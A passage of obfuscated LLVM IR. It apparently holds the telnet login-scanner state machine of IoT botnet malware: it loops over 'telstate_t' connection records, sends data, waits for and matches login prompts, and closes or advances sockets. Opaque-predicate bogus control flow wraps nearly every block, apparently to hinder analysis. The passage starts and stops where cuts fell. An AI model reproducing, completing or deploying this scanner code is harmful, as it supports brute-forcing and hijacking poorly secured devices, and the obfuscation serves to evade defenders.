  %1692 = sext i32 %1691 to i64
  %1693 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1692
  %1694 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1693, i32 0, i32 2
  store i8 0, i8* %1694, align 8
  %1695 = load i32, i32* %10, align 4
  %1696 = sext i32 %1695 to i64
  %1697 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1696
  %1698 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1697, i32 0, i32 3
  store i8 1, i8* %1698, align 1
  br label %3344

; <label>:1699:                                   ; preds = %originalBBpart2199
  %1700 = load i32, i32* %10, align 4
  %1701 = sext i32 %1700 to i64
  %1702 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1701
  %1703 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1702, i32 0, i32 0
  %1704 = load i32, i32* %1703, align 16
  %1705 = call i64 @send(i32 %1704, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.62, i32 0, i32 0), i64 2, i32 16384)
  %1706 = icmp slt i64 %1705, 0
  br i1 %1706, label %1707, label %1738

; <label>:1707:                                   ; preds = %1699
  %1708 = load i32, i32* @x.67
  %1709 = load i32, i32* @y.68
  %1710 = sub i32 %1708, 1
  %1711 = mul i32 %1708, %1710
  %1712 = urem i32 %1711, 2
  %1713 = icmp eq i32 %1712, 0
  %1714 = icmp slt i32 %1709, 10
  %1715 = or i1 %1713, %1714
  br i1 %1715, label %originalBB201, label %originalBB201alteredBB

originalBB201:                                    ; preds = %originalBB201alteredBB, %1707
  %1716 = load i32, i32* %10, align 4
  %1717 = sext i32 %1716 to i64
  %1718 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1717
  %1719 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1718, i32 0, i32 0
  %1720 = load i32, i32* %1719, align 16
  %1721 = call i32 @sclose(i32 %1720)
  %1722 = load i32, i32* %10, align 4
  %1723 = sext i32 %1722 to i64
  %1724 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1723
  %1725 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1724, i32 0, i32 2
  store i8 0, i8* %1725, align 8
  %1726 = load i32, i32* %10, align 4
  %1727 = sext i32 %1726 to i64
  %1728 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1727
  %1729 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1728, i32 0, i32 3
  store i8 1, i8* %1729, align 1
  %1730 = load i32, i32* @x.67
  %1731 = load i32, i32* @y.68
  %1732 = sub i32 %1730, 1
  %1733 = mul i32 %1730, %1732
  %1734 = urem i32 %1733, 2
  %1735 = icmp eq i32 %1734, 0
  %1736 = icmp slt i32 %1731, 10
  %1737 = or i1 %1735, %1736
  br i1 %1737, label %originalBBpart2203, label %originalBB201alteredBB

originalBBpart2203:                               ; preds = %originalBB201
  br label %3344

; <label>:1738:                                   ; preds = %1699
  %1739 = load i32, i32* @x.67
  %1740 = load i32, i32* @y.68
  %1741 = sub i32 %1739, 1
  %1742 = mul i32 %1739, %1741
  %1743 = urem i32 %1742, 2
  %1744 = icmp eq i32 %1743, 0
  %1745 = icmp slt i32 %1740, 10
  %1746 = or i1 %1744, %1745
  br i1 %1746, label %originalBB205, label %originalBB205alteredBB

originalBB205:                                    ; preds = %originalBB205alteredBB, %1738
  %1747 = load i32, i32* %10, align 4
  %1748 = sext i32 %1747 to i64
  %1749 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1748
  %1750 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1749, i32 0, i32 2
  store i8 6, i8* %1750, align 8
  %1751 = load i32, i32* @x.67
  %1752 = load i32, i32* @y.68
  %1753 = sub i32 %1751, 1
  %1754 = mul i32 %1751, %1753
  %1755 = urem i32 %1754, 2
  %1756 = icmp eq i32 %1755, 0
  %1757 = icmp slt i32 %1752, 10
  %1758 = or i1 %1756, %1757
  br i1 %1758, label %originalBBpart2207, label %originalBB205alteredBB

originalBBpart2207:                               ; preds = %originalBB205
  br label %3327

; <label>:1759:                                   ; preds = %101
  %1760 = load i32, i32* @x.67
  %1761 = load i32, i32* @y.68
  %1762 = sub i32 %1760, 1
  %1763 = mul i32 %1760, %1762
  %1764 = urem i32 %1763, 2
  %1765 = icmp eq i32 %1764, 0
  %1766 = icmp slt i32 %1761, 10
  %1767 = or i1 %1765, %1766
  br i1 %1767, label %originalBB209, label %originalBB209alteredBB

originalBB209:                                    ; preds = %originalBB209alteredBB, %1759
  %1768 = load i32, i32* %10, align 4
  %1769 = sext i32 %1768 to i64
  %1770 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1769
  %1771 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1770, i32 0, i32 6
  %1772 = load i32, i32* %1771, align 4
  %1773 = icmp eq i32 %1772, 0
  %1774 = load i32, i32* @x.67
  %1775 = load i32, i32* @y.68
  %1776 = sub i32 %1774, 1
  %1777 = mul i32 %1774, %1776
  %1778 = urem i32 %1777, 2
  %1779 = icmp eq i32 %1778, 0
  %1780 = icmp slt i32 %1775, 10
  %1781 = or i1 %1779, %1780
  br i1 %1781, label %originalBBpart2211, label %originalBB209alteredBB

originalBBpart2211:                               ; preds = %originalBB209
  br i1 %1773, label %1782, label %1789

; <label>:1782:                                   ; preds = %originalBBpart2211
  %1783 = call i64 @time(i64* null) #2
  %1784 = trunc i64 %1783 to i32
  %1785 = load i32, i32* %10, align 4
  %1786 = sext i32 %1785 to i64
  %1787 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1786
  %1788 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1787, i32 0, i32 6
  store i32 %1784, i32* %1788, align 4
  br label %1789

; <label>:1789:                                   ; preds = %1782, %originalBBpart2211
  %1790 = load i32, i32* @x.67
  %1791 = load i32, i32* @y.68
  %1792 = sub i32 %1790, 1
  %1793 = mul i32 %1790, %1792
  %1794 = urem i32 %1793, 2
  %1795 = icmp eq i32 %1794, 0
  %1796 = icmp slt i32 %1791, 10
  %1797 = or i1 %1795, %1796
  br i1 %1797, label %originalBB213, label %originalBB213alteredBB

originalBB213:                                    ; preds = %originalBB213alteredBB, %1789
  %1798 = load i32, i32* %10, align 4
  %1799 = sext i32 %1798 to i64
  %1800 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1799
  %1801 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1800, i32 0, i32 0
  %1802 = load i32, i32* %1801, align 16
  %1803 = load i32, i32* %10, align 4
  %1804 = sext i32 %1803 to i64
  %1805 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1804
  %1806 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1805, i32 0, i32 8
  %1807 = load i8*, i8** %1806, align 8
  %1808 = load i32, i32* %10, align 4
  %1809 = sext i32 %1808 to i64
  %1810 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1809
  %1811 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1810, i32 0, i32 7
  %1812 = load i16, i16* %1811, align 16
  %1813 = zext i16 %1812 to i32
  %1814 = call i32 @readUntil(i32 %1802, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.63, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %1807, i32 1024, i32 %1813)
  %1815 = icmp ne i32 %1814, 0
  %1816 = load i32, i32* @x.67
  %1817 = load i32, i32* @y.68
  %1818 = sub i32 %1816, 1
  %1819 = mul i32 %1816, %1818
  %1820 = urem i32 %1819, 2
  %1821 = icmp eq i32 %1820, 0
  %1822 = icmp slt i32 %1817, 10
  %1823 = or i1 %1821, %1822
  br i1 %1823, label %originalBBpart2215, label %originalBB213alteredBB

originalBBpart2215:                               ; preds = %originalBB213
  br i1 %1815, label %1824, label %1931

; <label>:1824:                                   ; preds = %originalBBpart2215
  %1825 = load i32, i32* %10, align 4
  %1826 = sext i32 %1825 to i64
  %1827 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1826
  %1828 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1827, i32 0, i32 6
  store i32 0, i32* %1828, align 4
  %1829 = load i32, i32* %10, align 4
  %1830 = sext i32 %1829 to i64
  %1831 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1830
  %1832 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1831, i32 0, i32 7
  store i16 0, i16* %1832, align 16
  %1833 = load i32, i32* %10, align 4
  %1834 = sext i32 %1833 to i64
  %1835 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1834
  %1836 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1835, i32 0, i32 8
  %1837 = load i8*, i8** %1836, align 8
  %1838 = call i8* @strstr(i8* %1837, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.63, i32 0, i32 0)) #10
  %1839 = icmp ne i8* %1838, null
  br i1 %1839, label %1840, label %1876

; <label>:1840:                                   ; preds = %1824
  %1841 = load i32, i32* @x.67
  %1842 = load i32, i32* @y.68
  %1843 = sub i32 %1841, 1
  %1844 = mul i32 %1841, %1843
  %1845 = urem i32 %1844, 2
  %1846 = icmp eq i32 %1845, 0
  %1847 = icmp slt i32 %1842, 10
  %1848 = or i1 %1846, %1847
  br i1 %1848, label %originalBB217, label %originalBB217alteredBB

originalBB217:                                    ; preds = %originalBB217alteredBB, %1840
  %1849 = load i32, i32* %10, align 4
  %1850 = sext i32 %1849 to i64
  %1851 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1850
  %1852 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1851, i32 0, i32 8
  %1853 = load i8*, i8** %1852, align 8
  call void @llvm.memset.p0i8.i64(i8* %1853, i8 0, i64 1024, i32 1, i1 false)
  %1854 = load i32, i32* %10, align 4
  %1855 = sext i32 %1854 to i64
  %1856 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1855
  %1857 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1856, i32 0, i32 0
  %1858 = load i32, i32* %1857, align 16
  %1859 = call i32 @sclose(i32 %1858)
  %1860 = load i32, i32* %10, align 4
  %1861 = sext i32 %1860 to i64
  %1862 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1861
  %1863 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1862, i32 0, i32 2
  store i8 0, i8* %1863, align 8
  %1864 = load i32, i32* %10, align 4
  %1865 = sext i32 %1864 to i64
  %1866 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1865
  %1867 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1866, i32 0, i32 3
  store i8 0, i8* %1867, align 1
  %1868 = load i32, i32* @x.67
  %1869 = load i32, i32* @y.68
  %1870 = sub i32 %1868, 1
  %1871 = mul i32 %1868, %1870
  %1872 = urem i32 %1871, 2
  %1873 = icmp eq i32 %1872, 0
  %1874 = icmp slt i32 %1869, 10
  %1875 = or i1 %1873, %1874
  br i1 %1875, label %originalBBpart2219, label %originalBB217alteredBB

originalBBpart2219:                               ; preds = %originalBB217
  br label %3344

; <label>:1876:                                   ; preds = %1824
  %1877 = load i32, i32* %10, align 4
  %1878 = sext i32 %1877 to i64
  %1879 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1878
  %1880 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1879, i32 0, i32 8
  %1881 = load i8*, i8** %1880, align 8
  %1882 = call i32 @matchPrompt(i8* %1881)
  %1883 = icmp ne i32 %1882, 0
  br i1 %1883, label %1904, label %1884

; <label>:1884:                                   ; preds = %1876
  %1885 = load i32, i32* %10, align 4
  %1886 = sext i32 %1885 to i64
  %1887 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1886
  %1888 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1887, i32 0, i32 8
  %1889 = load i8*, i8** %1888, align 8
  call void @llvm.memset.p0i8.i64(i8* %1889, i8 0, i64 1024, i32 1, i1 false)
  %1890 = load i32, i32* %10, align 4
  %1891 = sext i32 %1890 to i64
  %1892 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1891
  %1893 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1892, i32 0, i32 0
  %1894 = load i32, i32* %1893, align 16
  %1895 = call i32 @sclose(i32 %1894)
  %1896 = load i32, i32* %10, align 4
  %1897 = sext i32 %1896 to i64
  %1898 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1897
  %1899 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1898, i32 0, i32 2
  store i8 0, i8* %1899, align 8
  %1900 = load i32, i32* %10, align 4
  %1901 = sext i32 %1900 to i64
  %1902 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1901
  %1903 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1902, i32 0, i32 3
  store i8 1, i8* %1903, align 1
  br label %3344

; <label>:1904:                                   ; preds = %1876
  %1905 = load i32, i32* %10, align 4
  %1906 = sext i32 %1905 to i64
  %1907 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1906
  %1908 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1907, i32 0, i32 2
  store i8 7, i8* %1908, align 8
  br label %1909

; <label>:1909:                                   ; preds = %1904
  %1910 = load i32, i32* @x.67
  %1911 = load i32, i32* @y.68
  %1912 = sub i32 %1910, 1
  %1913 = mul i32 %1910, %1912
  %1914 = urem i32 %1913, 2
  %1915 = icmp eq i32 %1914, 0
  %1916 = icmp slt i32 %1911, 10
  %1917 = or i1 %1915, %1916
  br i1 %1917, label %originalBB221, label %originalBB221alteredBB

originalBB221:                                    ; preds = %originalBB221alteredBB, %1909
  %1918 = load i32, i32* %10, align 4
  %1919 = sext i32 %1918 to i64
  %1920 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1919
  %1921 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1920, i32 0, i32 8
  %1922 = load i8*, i8** %1921, align 8
  call void @llvm.memset.p0i8.i64(i8* %1922, i8 0, i64 1024, i32 1, i1 false)
  %1923 = load i32, i32* @x.67
  %1924 = load i32, i32* @y.68
  %1925 = sub i32 %1923, 1
  %1926 = mul i32 %1923, %1925
  %1927 = urem i32 %1926, 2
  %1928 = icmp eq i32 %1927, 0
  %1929 = icmp slt i32 %1924, 10
  %1930 = or i1 %1928, %1929
  br i1 %1930, label %originalBBpart2223, label %originalBB221alteredBB

originalBBpart2223:                               ; preds = %originalBB221
  br label %3344

; <label>:1931:                                   ; preds = %originalBBpart2215
  %1932 = load i32, i32* %10, align 4
  %1933 = sext i32 %1932 to i64
  %1934 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1933
  %1935 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1934, i32 0, i32 0
  %1936 = load i32, i32* %1935, align 16
  %1937 = load i32, i32* %10, align 4
  %1938 = sext i32 %1937 to i64
  %1939 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1938
  %1940 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1939, i32 0, i32 8
  %1941 = load i8*, i8** %1940, align 8
  %1942 = load i32, i32* %10, align 4
  %1943 = sext i32 %1942 to i64
  %1944 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1943
  %1945 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1944, i32 0, i32 7
  %1946 = load i16, i16* %1945, align 16
  %1947 = zext i16 %1946 to i32
  %1948 = call i32 @readUntil(i32 %1936, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.64, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %1941, i32 1024, i32 %1947)
  %1949 = icmp ne i32 %1948, 0
  br i1 %1949, label %1950, label %2121

; <label>:1950:                                   ; preds = %1931
  %1951 = load i32, i32* @x.67
  %1952 = load i32, i32* @y.68
  %1953 = sub i32 %1951, 1
  %1954 = mul i32 %1951, %1953
  %1955 = urem i32 %1954, 2
  %1956 = icmp eq i32 %1955, 0
  %1957 = icmp slt i32 %1952, 10
  %1958 = or i1 %1956, %1957
  br i1 %1958, label %originalBB225, label %originalBB225alteredBB

originalBB225:                                    ; preds = %originalBB225alteredBB, %1950
  %1959 = load i32, i32* %10, align 4
  %1960 = sext i32 %1959 to i64
  %1961 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1960
  %1962 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1961, i32 0, i32 6
  store i32 0, i32* %1962, align 4
  %1963 = load i32, i32* %10, align 4
  %1964 = sext i32 %1963 to i64
  %1965 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1964
  %1966 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1965, i32 0, i32 7
  store i16 0, i16* %1966, align 16
  %1967 = load i32, i32* %10, align 4
  %1968 = sext i32 %1967 to i64
  %1969 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1968
  %1970 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1969, i32 0, i32 8
  %1971 = load i8*, i8** %1970, align 8
  %1972 = call i8* @strstr(i8* %1971, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.64, i32 0, i32 0)) #10
  %1973 = icmp ne i8* %1972, null
  %1974 = load i32, i32* @x.67
  %1975 = load i32, i32* @y.68
  %1976 = sub i32 %1974, 1
  %1977 = mul i32 %1974, %1976
  %1978 = urem i32 %1977, 2
  %1979 = icmp eq i32 %1978, 0
  %1980 = icmp slt i32 %1975, 10
  %1981 = or i1 %1979, %1980
  br i1 %1981, label %originalBBpart2227, label %originalBB225alteredBB

originalBBpart2227:                               ; preds = %originalBB225
  br i1 %1973, label %1982, label %2018

; <label>:1982:                                   ; preds = %originalBBpart2227
  %1983 = load i32, i32* @x.67
  %1984 = load i32, i32* @y.68
  %1985 = sub i32 %1983, 1
  %1986 = mul i32 %1983, %1985
  %1987 = urem i32 %1986, 2
  %1988 = icmp eq i32 %1987, 0
  %1989 = icmp slt i32 %1984, 10
  %1990 = or i1 %1988, %1989
  br i1 %1990, label %originalBB229, label %originalBB229alteredBB

originalBB229:                                    ; preds = %originalBB229alteredBB, %1982
  %1991 = load i32, i32* %10, align 4
  %1992 = sext i32 %1991 to i64
  %1993 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1992
  %1994 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1993, i32 0, i32 8
  %1995 = load i8*, i8** %1994, align 8
  call void @llvm.memset.p0i8.i64(i8* %1995, i8 0, i64 1024, i32 1, i1 false)
  %1996 = load i32, i32* %10, align 4
  %1997 = sext i32 %1996 to i64
  %1998 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1997
  %1999 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1998, i32 0, i32 0
  %2000 = load i32, i32* %1999, align 16
  %2001 = call i32 @sclose(i32 %2000)
  %2002 = load i32, i32* %10, align 4
  %2003 = sext i32 %2002 to i64
  %2004 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2003
  %2005 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2004, i32 0, i32 2
  store i8 0, i8* %2005, align 8
  %2006 = load i32, i32* %10, align 4
  %2007 = sext i32 %2006 to i64
  %2008 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2007
  %2009 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2008, i32 0, i32 3
  store i8 0, i8* %2009, align 1
  %2010 = load i32, i32* @x.67
  %2011 = load i32, i32* @y.68
  %2012 = sub i32 %2010, 1
  %2013 = mul i32 %2010, %2012
  %2014 = urem i32 %2013, 2
  %2015 = icmp eq i32 %2014, 0
  %2016 = icmp slt i32 %2011, 10
  %2017 = or i1 %2015, %2016
  br i1 %2017, label %originalBBpart2231, label %originalBB229alteredBB

originalBBpart2231:                               ; preds = %originalBB229
  br label %3344

; <label>:2018:                                   ; preds = %originalBBpart2227
  %2019 = load i32, i32* @x.67
  %2020 = load i32, i32* @y.68
  %2021 = sub i32 %2019, 1
  %2022 = mul i32 %2019, %2021
  %2023 = urem i32 %2022, 2
  %2024 = icmp eq i32 %2023, 0
  %2025 = icmp slt i32 %2020, 10
  %2026 = or i1 %2024, %2025
  br i1 %2026, label %originalBB233, label %originalBB233alteredBB

originalBB233:                                    ; preds = %originalBB233alteredBB, %2018
  %2027 = load i32, i32* %10, align 4
  %2028 = sext i32 %2027 to i64
  %2029 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2028
  %2030 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2029, i32 0, i32 8
  %2031 = load i8*, i8** %2030, align 8
  %2032 = call i32 @matchPrompt(i8* %2031)
  %2033 = icmp ne i32 %2032, 0
  %2034 = load i32, i32* @x.67
  %2035 = load i32, i32* @y.68
  %2036 = sub i32 %2034, 1
  %2037 = mul i32 %2034, %2036
  %2038 = urem i32 %2037, 2
  %2039 = icmp eq i32 %2038, 0
  %2040 = icmp slt i32 %2035, 10
  %2041 = or i1 %2039, %2040
  br i1 %2041, label %originalBBpart2235, label %originalBB233alteredBB

originalBBpart2235:                               ; preds = %originalBB233
  br i1 %2033, label %2078, label %2042

; <label>:2042:                                   ; preds = %originalBBpart2235
  %2043 = load i32, i32* @x.67
  %2044 = load i32, i32* @y.68
  %2045 = sub i32 %2043, 1
  %2046 = mul i32 %2043, %2045
  %2047 = urem i32 %2046, 2
  %2048 = icmp eq i32 %2047, 0
  %2049 = icmp slt i32 %2044, 10
  %2050 = or i1 %2048, %2049
  br i1 %2050, label %originalBB237, label %originalBB237alteredBB

originalBB237:                                    ; preds = %originalBB237alteredBB, %2042
  %2051 = load i32, i32* %10, align 4
  %2052 = sext i32 %2051 to i64
  %2053 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2052
  %2054 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2053, i32 0, i32 8
  %2055 = load i8*, i8** %2054, align 8
  call void @llvm.memset.p0i8.i64(i8* %2055, i8 0, i64 1024, i32 1, i1 false)
  %2056 = load i32, i32* %10, align 4
  %2057 = sext i32 %2056 to i64
  %2058 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2057
  %2059 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2058, i32 0, i32 0
  %2060 = load i32, i32* %2059, align 16
  %2061 = call i32 @sclose(i32 %2060)
  %2062 = load i32, i32* %10, align 4
  %2063 = sext i32 %2062 to i64
  %2064 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2063
  %2065 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2064, i32 0, i32 2
  store i8 0, i8* %2065, align 8
  %2066 = load i32, i32* %10, align 4
  %2067 = sext i32 %2066 to i64
  %2068 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2067
  %2069 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2068, i32 0, i32 3
  store i8 1, i8* %2069, align 1
  %2070 = load i32, i32* @x.67
  %2071 = load i32, i32* @y.68
  %2072 = sub i32 %2070, 1
  %2073 = mul i32 %2070, %2072
  %2074 = urem i32 %2073, 2
  %2075 = icmp eq i32 %2074, 0
  %2076 = icmp slt i32 %2071, 10
  %2077 = or i1 %2075, %2076
  br i1 %2077, label %originalBBpart2239, label %originalBB237alteredBB

originalBBpart2239:                               ; preds = %originalBB237
  br label %3344

; <label>:2078:                                   ; preds = %originalBBpart2235
  %2079 = load i32, i32* @x.67
  %2080 = load i32, i32* @y.68
  %2081 = sub i32 %2079, 1
  %2082 = mul i32 %2079, %2081
  %2083 = urem i32 %2082, 2
  %2084 = icmp eq i32 %2083, 0
  %2085 = icmp slt i32 %2080, 10
  %2086 = or i1 %2084, %2085
  br i1 %2086, label %originalBB241, label %originalBB241alteredBB

originalBB241:                                    ; preds = %originalBB241alteredBB, %2078
  %2087 = load i32, i32* %10, align 4
  %2088 = sext i32 %2087 to i64
  %2089 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2088
  %2090 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2089, i32 0, i32 2
  store i8 7, i8* %2090, align 8
  %2091 = load i32, i32* @x.67
  %2092 = load i32, i32* @y.68
  %2093 = sub i32 %2091, 1
  %2094 = mul i32 %2091, %2093
  %2095 = urem i32 %2094, 2
  %2096 = icmp eq i32 %2095, 0
  %2097 = icmp slt i32 %2092, 10
  %2098 = or i1 %2096, %2097
  br i1 %2098, label %originalBBpart2243, label %originalBB241alteredBB

originalBBpart2243:                               ; preds = %originalBB241
  br label %2099

; <label>:2099:                                   ; preds = %originalBBpart2243
  %2100 = load i32, i32* @x.67
  %2101 = load i32, i32* @y.68
  %2102 = sub i32 %2100, 1
  %2103 = mul i32 %2100, %2102
  %2104 = urem i32 %2103, 2
  %2105 = icmp eq i32 %2104, 0
  %2106 = icmp slt i32 %2101, 10
  %2107 = or i1 %2105, %2106
  br i1 %2107, label %originalBB245, label %originalBB245alteredBB

originalBB245:                                    ; preds = %originalBB245alteredBB, %2099
  %2108 = load i32, i32* %10, align 4
  %2109 = sext i32 %2108 to i64
  %2110 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2109
  %2111 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2110, i32 0, i32 8
  %2112 = load i8*, i8** %2111, align 8
  call void @llvm.memset.p0i8.i64(i8* %2112, i8 0, i64 1024, i32 1, i1 false)
  %2113 = load i32, i32* @x.67
  %2114 = load i32, i32* @y.68
  %2115 = sub i32 %2113, 1
  %2116 = mul i32 %2113, %2115
  %2117 = urem i32 %2116, 2
  %2118 = icmp eq i32 %2117, 0
  %2119 = icmp slt i32 %2114, 10
  %2120 = or i1 %2118, %2119
  br i1 %2120, label %originalBBpart2247, label %originalBB245alteredBB

originalBBpart2247:                               ; preds = %originalBB245
  br label %3344

; <label>:2121:                                   ; preds = %1931
  %2122 = load i32, i32* %10, align 4
  %2123 = sext i32 %2122 to i64
  %2124 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2123
  %2125 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2124, i32 0, i32 0
  %2126 = load i32, i32* %2125, align 16
  %2127 = load i32, i32* %10, align 4
  %2128 = sext i32 %2127 to i64
  %2129 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2128
  %2130 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2129, i32 0, i32 8
  %2131 = load i8*, i8** %2130, align 8
  %2132 = load i32, i32* %10, align 4
  %2133 = sext i32 %2132 to i64
  %2134 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2133
  %2135 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2134, i32 0, i32 7
  %2136 = load i16, i16* %2135, align 16
  %2137 = zext i16 %2136 to i32
  %2138 = call i32 @readUntil(i32 %2126, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.65, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %2131, i32 1024, i32 %2137)
  %2139 = icmp ne i32 %2138, 0
  br i1 %2139, label %2140, label %2203

; <label>:2140:                                   ; preds = %2121
  %2141 = load i32, i32* %10, align 4
  %2142 = sext i32 %2141 to i64
  %2143 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2142
  %2144 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2143, i32 0, i32 6
  store i32 0, i32* %2144, align 4
  %2145 = load i32, i32* %10, align 4
  %2146 = sext i32 %2145 to i64
  %2147 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2146
  %2148 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2147, i32 0, i32 7
  store i16 0, i16* %2148, align 16
  %2149 = load i32, i32* %10, align 4
  %2150 = sext i32 %2149 to i64
  %2151 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2150
  %2152 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2151, i32 0, i32 8
  %2153 = load i8*, i8** %2152, align 8
  %2154 = call i8* @strstr(i8* %2153, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.65, i32 0, i32 0)) #10
  %2155 = icmp ne i8* %2154, null
  br i1 %2155, label %2156, label %2192

; <label>:2156:                                   ; preds = %2140
  %2157 = load i32, i32* @x.67
  %2158 = load i32, i32* @y.68
  %2159 = sub i32 %2157, 1
  %2160 = mul i32 %2157, %2159
  %2161 = urem i32 %2160, 2
  %2162 = icmp eq i32 %2161, 0
  %2163 = icmp slt i32 %2158, 10
  %2164 = or i1 %2162, %2163
  br i1 %2164, label %originalBB249, label %originalBB249alteredBB

originalBB249:                                    ; preds = %originalBB249alteredBB, %2156
  %2165 = load i32, i32* %10, align 4
  %2166 = sext i32 %2165 to i64
  %2167 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %2166
  %2168 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2167, i32 0, i32 8
  %2169 = load i8*, i8** %2168, align 8
